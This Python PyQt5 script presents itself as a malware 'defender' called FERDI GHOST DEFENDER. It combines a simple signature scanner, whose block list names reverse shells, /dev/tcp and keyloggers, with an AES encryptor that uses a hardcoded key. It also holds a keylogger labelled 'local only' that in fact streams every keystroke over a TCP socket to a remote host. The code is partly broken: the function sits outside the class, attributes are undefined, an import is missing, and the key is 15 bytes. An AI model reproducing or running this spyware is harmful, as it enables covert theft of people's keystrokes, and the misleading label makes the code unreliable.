import os
import sys
import time
import socket
import threading
import scapy.all as scapy
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QLabel, QTextEdit, QHBoxLayout, QFileDialog, QMessageBox
from PyQt5.QtGui import QFont, QTextCursor
from PyQt5.QtCore import Qt, QTimer
from Crypto.Cipher import AES

# --------------------------
# ASCII Banner
# --------------------------
BANNER_ASCII = r"""
███████╗███████╗██████╗ ███████╗██╗ ██████╗ ███████╗
██╔════╝██╔════╝██╔══██╗██╔════╝██║██╔═══██╗██╔════╝
█████╗  █████╗  ██████╔╝█████╗  ██║██║   ██║███████╗
██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██║██║   ██║╚════██║
██║     ███████╗██║     ███████╗██║╚██████╔╝███████║
╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝ ╚═════╝ ╚══════╝
"""

# --------------------------
# Malware Signatures
# --------------------------
SIGNATURES = {
    "RAT": [b"socket.connect", b"reverse_shell"],
    "BACKDOOR": [b"/dev/tcp/", b"nohup"],
    "VIRUS": [b"mov eax", b"jmp", b"xor"],
    "KEYLOGGER": [b"keylogger", b"keyboard_hook"]
}

# --------------------------
# GUI Application
# --------------------------
class FerdiGhost(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("FERDI GHOST DEFENDER 3.0")
        self.setFixedSize(1000, 700)
        self.setStyleSheet("background-color: black; color: #00ff66;")
        self.setFont(QFont("Courier New", 10))
        self.detected_files = []

        layout = QVBoxLayout()

        self.banner = QLabel(BANNER_ASCII)
        self.banner.setAlignment(Qt.AlignCenter)
        self.banner.setFont(QFont("Courier New", 10))
        self.banner.setStyleSheet("color: #00ff66;")
        layout.addWidget(self.banner)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background-color: black; border: 1px solid #00ff66; color: #00ff66;")
        layout.addWidget(self.output)

        btn_layout = QHBoxLayout()
        self.scan_file_btn = QPushButton("Scan File")
        self.scan_folder_btn = QPushButton("Scan Folder")
        self.keylogger_btn = QPushButton("Keylogger Start")
        self.encrypt_btn = QPushButton("Encrypt File")

        for btn in [self.scan_file_btn, self.scan_folder_btn, self.keylogger_btn, self.encrypt_btn]:
            btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 5px;")
            btn_layout.addWidget(btn)

        layout.addLayout(btn_layout)
        self.setLayout(layout)

        # Button Actions
        self.scan_file_btn.clicked.connect(self.scan_file_action)
        self.scan_folder_btn.clicked.connect(self.scan_folder_action)
        self.keylogger_btn.clicked.connect(self.start_keylogger)
        self.encrypt_btn.clicked.connect(self.encrypt_file_action)

    # --------------------------
    # File / Folder Scanner
    # --------------------------
    def scan_file(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
                for family, sigs in SIGNATURES.items():
                    for sig in sigs:
                        if sig in data:
                            return f"[INFECTED: {family}] {path}"
            return f"[CLEAN] {path}"
        except Exception as e:
            return f"[ERROR] {path}: {e}"

    def scan_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            result = self.scan_file(path)
            self.output.append(result)

    def scan_folder_action(self):
        path = QFileDialog.getExistingDirectory(self, "Select Folder")
        if path:
            for root, _, files in os.walk(path):
                for name in files:
                    fpath = os.path.join(root, name)
                    result = self.scan_file(fpath)
                    self.output.append(result)

    # --------------------------
    # AES File Encryptor
    # --------------------------
    def encrypt_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Encrypt")
        if path:
            key = b'16bytesferdikey'
            cipher = AES.new(key, AES.MODE_EAX)
            with open(path, "rb") as f:
                plaintext = f.read()
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            with open(path + ".enc", "wb") as f:
                f.write(cipher.nonce + tag + ciphertext)
            self.output.append(f"[ENCRYPTED] {path}")

    # --------------------------
    # Keylogger 
    # --------------------------
def start_keylogger(self):
    print("[KEYLOGGER] Started (local only)")
    try:
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.target_ip, self.target_port))
        
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = f"[{key}]"
            
            try:
                self.socket.sendall(char.encode())
            except Exception as e:
                print(f"[ERROR] Failed to send data: {e}")
                return False  # Stop listener on error

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    except Exception as e:
        print(f"[ERROR] Keylogger failed: {e}")
    finally:
        if self.socket:
            self.socket.close()

# --------------------------
# Run App
# --------------------------
def run_app():
    os.environ["XDG_RUNTIME_DIR"] = "/tmp/runtime-root"
    app = QApplication(sys.argv)
    window = FerdiGhost()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    run_app()
